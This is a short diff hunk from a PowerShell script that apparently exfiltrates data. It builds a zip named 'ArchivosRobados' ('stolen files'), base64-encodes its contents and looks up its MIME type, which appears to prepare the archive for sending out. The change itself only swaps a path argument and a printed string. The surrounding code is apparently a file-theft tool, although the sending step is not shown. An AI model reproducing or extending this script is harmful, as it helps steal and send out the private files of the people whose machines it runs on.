@@ -175,8 +175,8 @@ $FileEncrypted = 'c:\temp\ArchivosRobados-"$ArchivosRobados".zip'
 Write-Host "Nombre de Archivos Robados: $ArchivosRobados" -ForegroundColor Green
 
 # Get the source file contents and details, encode in base64
-$sourceItem = Get-Item $FileEncrypted
-Write-Host "c:\temp\ArchivosRobados-"$ArchivosRobados".zip" -ForegroundColor Green
+$sourceItem = Get-Item c:\temp\ArchivosRobados-"$ArchivosRobados".zip
+Write-Host "$FileEncrypted" -ForegroundColor Green
 
 $sourceBase64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($sourceItem.FullName))
 $sourceMime = [System.Web.MimeMapping]::GetMimeMapping($sourceItem.FullName)
